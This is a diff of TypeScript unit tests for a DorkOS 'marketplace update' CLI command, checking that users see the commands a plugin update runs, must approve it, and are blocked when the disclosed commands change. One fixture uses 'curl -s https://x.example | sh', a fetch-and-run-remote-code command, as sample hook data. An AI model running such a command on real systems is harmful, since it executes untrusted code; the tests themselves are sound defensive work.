@@ -29,7 +29,19 @@ function check(overrides: Record<string, unknown> = {}) {
   };
 }
 
-const ADVISORY_RESULT = { checks: [check()], applied: [] };
+/** What a new version runs: one hook, the given command. */
+function runs(command: string) {
+  return {
+    hooks: [{ event: 'PreToolUse', matcher: null, command, source: null }],
+    schedules: [],
+    mcpServers: [],
+    lspServers: [],
+    monitors: [],
+    executables: [],
+    skillTools: [],
+    skillCommands: [],
+  };
+}
 
 /** Everything printed to stdout, one string. */
 function printed(spy: MockInstance<typeof console.log>): string {
@@ -39,7 +51,13 @@ function printed(spy: MockInstance<typeof console.log>): string {
 describe('parseUpdateArgs', () => {
   it('parses a bare invocation with no args', () => {
     const args = parseUpdateArgs([]);
-    expect(args).toEqual({ name: undefined, apply: false, projectPath: undefined });
+    expect(args).toEqual({
+      name: undefined,
+      apply: false,
+      yes: false,
+      approvalToken: undefined,
+      projectPath: undefined,
+    });
   });
 
   it('parses a single name', () => {
@@ -47,13 +65,29 @@ describe('parseUpdateArgs', () => {
     expect(args.name).toBe('demo-pkg');
   });
 
-  it('parses --apply and --project', () => {
-    const args = parseUpdateArgs(['demo-pkg', '--apply', '--project', '/tmp/web']);
-    expect(args).toEqual({ name: 'demo-pkg', apply: true, projectPath: '/tmp/web' });
+  it('parses --apply, --yes, --approval and --project', () => {
+    const args = parseUpdateArgs([
+      'demo-pkg',
+      '--apply',
+      '-y',
+      '--approval',
+      'tok-1',
+      '--project',
+      '/tmp/web',
+    ]);
+    expect(args).toEqual({
+      name: 'demo-pkg',
+      apply: true,
+      yes: true,
+      approvalToken: 'tok-1',
+      projectPath: '/tmp/web',
+    });
   });
 
   it('throws on unknown option', () => {
-    expect(() => parseUpdateArgs(['--nope'])).toThrow(/Unknown option for 'update': --nope/);
+    expect(() => parseUpdateArgs(['--nope'])).toThrow(
+      /Unknown option for 'marketplace update': --nope/
+    );
   });
 });
 
@@ -103,7 +137,6 @@ describe('runUpdate', () => {
             marketplace: '',
           }),
         ],
-        applied: [],
       })
     );
     vi.stubGlobal('fetch', fetchMock);
@@ -181,47 +214,6 @@ describe('runUpdate', () => {
     expect(printed(logSpy)).toContain('flwo  could not check: Package not installed: flwo');
   });
 
-  it('exits 1 when a requested apply fails', async () => {
-    // Purpose: a script running `--apply` must be able to tell that an
-    // update did not land.
-    vi.stubGlobal(
-      'fetch',
-      vi.fn().mockResolvedValueOnce(mockResponse(500, { error: 'install failed' }))
-    );
-
-    const code = await runUpdate({ name: 'demo-pkg', apply: true });
-
-    expect(code).toBe(1);
-    expect(printed(logSpy)).toContain('demo-pkg  could not check: install failed');
-  });
-
-  it('--apply sends apply: true and renders the applied list', async () => {
-    const appliedResult = {
-      checks: ADVISORY_RESULT.checks,
-      applied: [
-        {
-          ok: true,
-          packageName: 'demo-pkg',
-          version: '1.3.0',
-          installPath: '/home/user/.dork/plugins/demo-pkg',
-        },
-      ],
-    };
-    const fetchMock = vi.fn().mockResolvedValueOnce(mockResponse(200, appliedResult));
-    vi.stubGlobal('fetch', fetchMock);
-
-    const code = await runUpdate({ name: 'demo-pkg', apply: true });
-
-    expect(code).toBe(0);
-    const [, init] = fetchMock.mock.calls[0];
-    expect(JSON.parse(init.body)).toEqual({ apply: true });
-    const out = printed(logSpy);
-    expect(out).toContain('Applied:');
-    expect(out).toContain('demo-pkg@1.3.0');
-    // No --apply hint when we actually applied.
-    expect(out).not.toContain('Run again with --apply');
-  });
-
   describe('without a name: the all-packages door', () => {
     /** One installation's check; defaults describe a global update. */
     function installation(overrides: Record<string, unknown> = {}) {
@@ -287,6 +279,27 @@ describe('runUpdate', () => {
       );
     });
 
+    it.each([false, true])(
+      'says the running DorkOS is older than the CLI when it has no updates door (apply: %s)',
+      async (apply) => {
+        // Purpose: a server started before this CLI answers the router's bare
+        // "Not found"; a person needs to hear "restart DorkOS" instead.
+        vi.stubGlobal(
+          'fetch',
+          vi
+            .fn()
+            .mockResolvedValueOnce(mockResponse(404, { error: 'Not found', code: 'API_NOT_FOUND' }))
+        );
+
+        const code = await runUpdate({ apply });
+
+        expect(code).toBe(1);
+        expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toMatch(
+          /older than this CLI.*Restart DorkOS/s
+        );
+      }
+    );
+
     it('says so when nothing is installed', async () => {
       vi.stubGlobal('fetch', vi.fn().mockResolvedValueOnce(mockResponse(200, { checks: [] })));
 
@@ -296,68 +309,260 @@ describe('runUpdate', () => {
       expect(printed(logSpy)).toContain('No installed packages to check.');
     });
 
-    it('--apply sends one POST and lists what it reinstalled, by place', async () => {
-      // Purpose: applying is one request too, and the output says which copy
-      // of a package was updated.
-      const fetchMock = vi.fn().mockResolvedValueOnce(
-        mockResponse(200, {
-          checks: [
-            installation({
-              scope: 'override',
-              agentPath: '/work/alpha',
-              agentName: 'Alpha',
-              applied: {
-                ok: true,
-                packageName: 'flow',
-                version: '0.7.3',
-                installPath: '/work/alpha/.dork/plugins/flow',
+    it('--apply prints what each new version runs, then updates exactly that (DOR-2306)', async () => {
+      // Purpose: the person approves what they read. The run prints every
+      // command a new version runs, and the apply sends each installation back
+      // with the version and disclosure it printed, so the server installs
+      // only what still matches.
+      const alpha = installation({
+        scope: 'override',
+        agentPath: '/work/alpha',
+        agentName: 'Alpha',
+        installPath: '/work/alpha/.dork/plugins/flow',
+        disclosed: runs('curl -s https://x.example | sh'),
+        contentHash: 'sha256:staged',
+      });
+      const fetchMock = vi
+        .fn()
+        .mockResolvedValueOnce(mockResponse(200, { checks: [alpha] }))
+        .mockResolvedValueOnce(
+          mockResponse(200, {
+            checks: [
+              {
+                ...alpha,
+                applied: {
+                  ok: true,
+                  packageName: 'flow',
+                  version: '0.7.3',
+                  installPath: '/work/alpha/.dork/plugins/flow',
+                },
               },
-            }),
-          ],
-        })
-      );
+            ],
+          })
+        );
       vi.stubGlobal('fetch', fetchMock);
 
-      const code = await runUpdate({ apply: true, projectPath: '/work/alpha' });
+      const code = await runUpdate({ apply: true, yes: true, projectPath: '/work/alpha' });
 
       expect(code).toBe(0);
-      expect(fetchMock).toHaveBeenCalledTimes(1);
-      expect(fetchMock.mock.calls[0][0]).toMatch(/\/api\/marketplace\/updates$/);
-      expect(fetchMock.mock.calls[0][1].method).toBe('POST');
-      expect(JSON.parse(fetchMock.mock.calls[0][1].body)).toEqual({
+      expect(fetchMock.mock.calls[0][1].method).toBe('GET');
+      expect(fetchMock.mock.calls[1][0]).toMatch(/\/api\/marketplace\/updates$/);
+      expect(fetchMock.mock.calls[1][1].method).toBe('POST');
+      expect(JSON.parse(fetchMock.mock.calls[1][1].body)).toEqual({
         apply: true,
         projectPath: '/work/alpha',
+        targets: [
+          {
+            installPath: '/work/alpha/.dork/plugins/flow',
+            latestVersion: '0.7.3',
+            disclosed: runs('curl -s https://x.example | sh'),
+            contentHash: 'sha256:staged',
+          },
+        ],
       });
       const out = printed(logSpy);
+      expect(out).toContain('What the new version runs:');
+      expect(out).toContain('curl -s https://x.example | sh');
       expect(out).toContain('Applied:');
       expect(out).toContain('  flow [Alpha]@0.7.3 → /work/alpha/.dork/plugins/flow');
       expect(out).not.toContain('Run again with --apply');
     });
 
-    it('exits 1 and says why when a reinstall failed, after listing the ones that landed', async () => {
-      // Purpose: a script running --apply must be able to tell that an update
-      // did not land, and a person must see which one and why.
+    it('--apply prints what each update had to say (DOR-2322)', async () => {
+      // Purpose: an update that kept files it could not prove says so in the
+      // terminal, under its Applied line. Fails if applied warnings are dropped.
+      const alpha = installation({
+        installPath: '/home/.dork/plugins/flow',
+        disclosed: runs('echo hi'),
+        contentHash: 'sha256:staged',
+      });
+      const said =
+        "DorkOS couldn't download the version of flow you had, so it couldn't tell whether 1 file was yours or left over from that version. It kept it: old.md.";
       vi.stubGlobal(
         'fetch',
-        vi.fn().mockResolvedValueOnce(
+        vi
+          .fn()
+          .mockResolvedValueOnce(mockResponse(200, { checks: [alpha] }))
+          .mockResolvedValueOnce(
+            mockResponse(200, {
+              checks: [
+                {
+                  ...alpha,
+                  applied: {
+                    ok: true,
+                    packageName: 'flow',
+                    version: '0.7.3',
+                    installPath: '/home/.dork/plugins/flow',
+                    warnings: [said],
+                  },
+                },
+              ],
+            })
+          )
+      );
+
+      expect(await runUpdate({ apply: true, yes: true })).toBe(0);
+
+      const out = printed(logSpy);
+      expect(out).toMatch(
+        /flow@0\.7\.3 → \/home\/\.dork\/plugins\/flow\n {4}DorkOS couldn't download/
+      );
+    });
+
+    it('--apply without --yes asks first, and a no (or no terminal) updates nothing', async () => {
+      // Purpose: printing is not approving. Without a yes nothing is sent, and
+      // a run with no terminal to answer from declines rather than applies.
+      const fetchMock = vi
+        .fn()
+        .mockResolvedValueOnce(
+          mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
+        );
+      vi.stubGlobal('fetch', fetchMock);
+
+      const code = await runUpdate({ apply: true });
+
+      expect(code).toBe(0);
+      expect(fetchMock).toHaveBeenCalledTimes(1);
+      expect(printed(logSpy)).toContain('Nothing was updated.');
+    });
+
+    it('--apply with a name updates only that package\u2019s installations, and says when it has none', async () => {
+      const fetchMock = vi
+        .fn()
+        .mockResolvedValueOnce(
           mockResponse(200, {
             checks: [
-              installation({
-                applied: { ok: true, packageName: 'flow', version: '0.7.3', installPath: '/p' },
-              }),
-              installation({
-                packageName: 'broken',
-                scope: 'agent-local',
-                agentPath: '/work/alpha',
-                agentName: 'Alpha',
-                applyError: 'disk full',
-              }),
+              installation({ disclosed: null }),
+              installation({ packageName: 'other', installPath: '/o', disclosed: null }),
             ],
           })
         )
+        .mockResolvedValueOnce(mockResponse(200, { checks: [] }));
+      vi.stubGlobal('fetch', fetchMock);
+
+      await runUpdate({ name: 'flow', apply: true, yes: true });
+
+      const body = JSON.parse(fetchMock.mock.calls[1][1].body);
+      expect(body.targets.map((t: { installPath: string }) => t.installPath)).toEqual([
+        '/home/me/.dork/plugins/flow',
+      ]);
+
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValueOnce(mockResponse(200, { checks: [] })));
+      expect(await runUpdate({ name: 'flwo', apply: true, yes: true })).toBe(1);
+      expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toContain(
+        'flwo is not installed here.'
+      );
+    });
+
+    it('never offers a new version it could not say what it runs', async () => {
+      // Purpose: only what can be shown can be approved.
+      const fetchMock = vi
+        .fn()
+        .mockResolvedValueOnce(mockResponse(200, { checks: [installation()] }));
+      vi.stubGlobal('fetch', fetchMock);
+
+      const code = await runUpdate({ apply: true, yes: true });
+
+      expect(code).toBe(0);
+      expect(fetchMock).toHaveBeenCalledTimes(1);
+    });
+
+    it('prints how to retry when a person has to approve it first (an agent\u2019s run)', async () => {
+      vi.stubGlobal(
+        'fetch',
+        vi
+          .fn()
+          .mockResolvedValueOnce(
+            mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
+          )
+          .mockResolvedValueOnce(
+            mockResponse(202, {
+              status: 'requires_confirmation',
+              confirmationToken: 'tok-9',
+              message: 'A person must approve these updates in DorkOS.',
+            })
+          )
       );
 
-      const code = await runUpdate({ apply: true });
+      const code = await runUpdate({ name: 'flow', apply: true, yes: true });
+
+      expect(code).toBe(1);
+      const err = errSpy.mock.calls.map((c) => String(c[0])).join('\n');
+      expect(err).toContain('A person must approve these updates in DorkOS.');
+      expect(err).toContain(
+        'Retry with: dorkos marketplace update flow --apply --yes --approval tok-9'
+      );
+    });
+
+    it('sends the approval token on the retry', async () => {
+      const fetchMock = vi
+        .fn()
+        .mockResolvedValueOnce(
+          mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
+        )
+        .mockResolvedValueOnce(mockResponse(200, { checks: [] }));
+      vi.stubGlobal('fetch', fetchMock);
+
+      await runUpdate({ apply: true, yes: true, approvalToken: 'tok-9' });
+
+      expect(JSON.parse(fetchMock.mock.calls[1][1].body).confirmationToken).toBe('tok-9');
+    });
+
+    it('updates nothing and exits 1 when a new version changed what it runs since the check', async () => {
+      vi.stubGlobal(
+        'fetch',
+        vi
+          .fn()
+          .mockResolvedValueOnce(
+            mockResponse(200, { checks: [installation({ disclosed: runs('x') })] })
+          )
+          .mockResolvedValueOnce(
+            mockResponse(409, {
+              error: 'What an update would install is not what was shown.',
+              code: 'disclosure_changed',
+            })
+          )
+      );
+
+      const code = await runUpdate({ apply: true, yes: true });
+
+      expect(code).toBe(1);
+      expect(errSpy.mock.calls.map((c) => String(c[0])).join('\n')).toContain(
+        'Nothing was updated. What an update would install is not what was shown.'
+      );
+    });
+
+    it('exits 1 and says why when a reinstall failed, after listing the ones that landed', async () => {
+      // Purpose: a script running --apply must be able to tell that an update
+      // did not land, and a person must see which one and why.
+      const flow = installation({ disclosed: null });
+      const broken = installation({
+        packageName: 'broken',
+        scope: 'agent-local',
+        agentPath: '/work/alpha',
+        agentName: 'Alpha',
+        installPath: '/work/alpha/.dork/plugins/broken',
+        disclosed: null,
+      });
+      vi.stubGlobal(
+        'fetch',
+        vi
+          .fn()
+          .mockResolvedValueOnce(mockResponse(200, { checks: [flow, broken] }))
+          .mockResolvedValueOnce(
+            mockResponse(200, {
+              checks: [
+                {
+                  ...flow,
+                  applied: { ok: true, packageName: 'flow', version: '0.7.3', installPath: '/p' },
+                },
+                { ...broken, applyError: 'disk full' },
+              ],
+            })
+          )
+      );
+
+      const code = await runUpdate({ apply: true, yes: true });
 
       expect(code).toBe(1);
       const out = printed(logSpy);
